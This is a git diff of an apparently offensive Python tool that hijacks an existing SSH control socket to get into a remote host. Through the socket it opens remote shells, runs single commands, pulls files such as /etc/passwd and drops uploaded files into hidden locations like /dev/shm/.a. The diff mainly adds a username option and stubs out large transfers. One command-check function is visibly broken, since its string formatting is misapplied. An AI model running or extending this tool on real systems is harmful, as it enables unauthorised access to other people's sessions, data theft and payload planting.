@@ -47,19 +47,30 @@ def check_command_existence(cmd, socket, username):
     """
     #output = subprocess.Popen(["command", "-v", "%s >/dev/null ; echo $?".format(cmd)])
     #need subprocess.call here, will steal control from the main script, but it will only be for a second as that command wont hang 
-    output = subprocess.Popen(['xterm', '-e', 'ssh -S {} {}@ "command -v {} > /dev/null ; echo $?"'.format(socket, username, cmd)], start_new_session=True)
+    """
+    import subprocess
+    return_code = subprocess.call(["ssh", "-S", "/tmp/sock", "pi@", "'id'", ">/dev/null", ";echo", "$?"])
+    if return_code == 0:
+        print("Command executed successfully.")
+    else:
+        print("Command failed with return code", return_code)
+    """
+    output = subprocess.call(["ssh", "-S", "{}", "{}@", "'command -v {}'", ">/dev/null", ";echo", "$?".format(socket, username, cmd)])
     print(int(output))
     return int(output) == 0
 
-def check_args(socket):
+def check_args(socket, username):
     """
-    Verifies that the script is passed a socket file
+    Verifies that the script is passed a socket file + username to use
     Check that the socket passed with -s actually is present
+    Check that the username is passed with -u 
     """
     if not socket:
         logging.error("Wrong number of args, require -s <path-to-socket>")
         sys.exit(2)
-    #if not os.path.isfile(socket):
+    if not username:
+        logging.error("Wrong number of args, require -u <username>\r\nThis is the username to use on the remote host when interacting")
+        sys.exit(4)
     if not os.path.exists(socket):
         logging.error("Socket file {} not found!!!".format(socket))
         sys.exit(3)
@@ -81,7 +92,7 @@ def create_structure(path):
     else:
         os.system(f'mkdir -p {path}/target')
 
-def do_download(socket):
+def do_download(socket, username):
     """
     Downloads file off the remote host and saves it in user chosen location 
     ssh -S /tmp/sock pi@ 'cat /etc/passwd' > /tmp/target_passwd
@@ -92,71 +103,57 @@ def do_download(socket):
     if os.path.isdir("/tmp/target") and l_path == "":
         l_path = "/tmp/target"
     if validate_path(l_path) == False:
-        print("Local path does not exist, try again")
+        print("No such file or directory, try again...")
     else:
-        username = input("Enter username to use (default x): ")
-        if username == "":
-            username = "x"
         subprocess.Popen(["xterm", "-e", "ssh -S {} {}@ 'cat {}' > {}/{}".format(socket, username, r_path, l_path, file_name)])
         return 0
       
 
-def do_upload(socket):
+def do_upload(socket, username):
     """
     Uploads a file from your local machine to the remote host
+    l_path is validated, no way to easily validate r_path, should look into later
+    ssh -S /tmp/sock pi@ 'cat > /dev/shm/.a' < /tmp/shell 
     """
-    #ssh -S /tmp/sock pi@ 'cat > /dev/shm/.a' < /tmp/shell 
     l_path = input("Enter the abs path of the file to upload: ")
+    if validate_path(l_path) == False:
+        print("No such file or directory, try again...")
+        return 1
     r_path = input("Enter the path to upload the file to: ")
-    username = input("Enter the username to use (default x): ")
-    if username == "":
-        username = "x"
     subprocess.Popen(["xterm", "-e", "ssh -S {} {}@ 'cat > {}' < {}".format(socket, username, r_path, l_path)])
     return 0
 
-def do_download_large(r_path, l_path, method, socket, username, file_name):
+def do_download_large(socket, username):
     """
     Downloads larger files from the remote host and saves it in a user chosen location
     Uses zip | gzip
+    Should add functionaility to ensure method passed is is actually on device before just running subprocess.Popen
     """
-    #should verify the l_path exists 
-    #split on / and take all minus the filename 
+    pass
+    
+
+
+def do_upload_large(socket, username):
     '''
-    my_path = '/tmp/target/passwd'
-    print(my_path.split("/")[1:-1])
-    ['tmp', 'target']    print(command)
-
-    >>> 
+    Function to upload a large file to the remote host 
+    Two current method are gzip and zip 
+    Should add functionaility to ensure method passed is is actually on device before just running subprocess.Popen
     '''
-    #if os.path.isdir(l_path.split("/")[1:-1]):
-    subprocess.Popen(["xterm", "-e", "ssh -S {} {}@ 'cat {} | {}' > {}/{}".format(socket, username, r_path, method, l_path, file_name)])
-    print("xterm -e ssh -S {} {}@ 'cat {} | {}' > {}/{}")
-    #    return 0
-    #else:
-    #    print("Directory you are trying to save the file in doesnt exist")
-
-def do_upload_large(r_path, l_path, method):
-    pass 
+    pass
 
 
-def spawn_shell(socket):
+def spawn_shell(socket, username):
     #ssh -S /tmp/sock pi@ '/bin/sh'
     print("Shell Options:\r\n\r\n/bin/sh (default)\r\n/bin/bash\r\n")
     shell_type = input("Shell Type: ")
     if shell_type == "":
         shell_type = "/bin/sh"
-    username = input("Username (default x): ")
-    if username == "":
-        username = "x"
     subprocess.Popen(['xterm', '-e', 'ssh -S {} {}@ "{}"'.format(socket, username, shell_type)], start_new_session=True)
     return 0
 
-def single_cmd(socket):
+def single_cmd(socket, username):
     #ssh -S /tmp/sock pi@ 'id'
     cmd = input("Enter cmd: ")
-    username = input("Username (default x): ")
-    if username == "":
-        username = "x"
     subprocess.Popen(['xterm', '-e', 'ssh -S {} {}@ "{}"'.format(socket, username, cmd)], start_new_session=True)
 
 
@@ -177,6 +174,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
     parser.add_argument("-s", "--socket", action="store", dest="socket")
+    parser.add_argument("-u", "--username", action="store", dest="username")
     #should have a username arg here and then avoid all the prompts for it 
     #user would set a default username to use for the script 
     #can have a option to switch the username, would be a command to use 
@@ -184,7 +182,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     banner()
-    check_args(args.socket)
+    check_args(args.socket, args.username)
 
     keep_going = True
     try:
@@ -196,10 +194,10 @@ if __name__ == '__main__':
             options = options.rstrip()
 
             if options == "shell":
-                spawn_shell(args.socket)
+                spawn_shell(args.socket, args.username)
 
             elif options == 'cmd':
-                single_cmd(args.socket)
+                single_cmd(args.socket, args.username)
 
             elif options == 'exit':
                 print("Goodbye...")
@@ -212,10 +210,10 @@ if __name__ == '__main__':
                 create_structure(path)
 
             elif options == 'download':
-                do_download(args.socket)
+                do_download(args.socket, args.username)
             
             elif options == 'upload':
-                do_upload(args.socket)
+                do_upload(args.socket, args.username)
 
             elif options == 'test':
                 status = check_command_existence('whoami', args.socket, "x")
@@ -224,30 +222,15 @@ if __name__ == '__main__':
                 else:
                     print("ugh")
 
-
             elif options == 'ldownload':
-                r_path = input("Enter the file path to grab: ")
-                file_name = r_path.split("/")[-1]
-                l_path = input("Enter path to store file (default /tmp/target): ")
-                if os.path.isdir("/tmp/target") and l_path == "":
-                    l_path = "/tmp/target"
-                method = input("Enter compression method (defualt gzip):")
-                if method == "":
-                    method = "gzip"
-                username = input("Enter the username to use (default x): ")
-                if username == "":
-                    username = "x"
-                print(r_path)
-                print(l_path)
-                print(method)
-                print(args.socket)
-                print(username)
-                print(file_name)
-                do_download_large(r_path, l_path, method, args.socket, username, file_name)
+                do_download_large(args.socket, args.username)
+
+            elif options == 'lupload':
+                do_upload_large(args.socket, args.username)
 
 
         
     except:
-        print("Cry")
+        print("You made the panda sad <panda emoji here>")
         
 
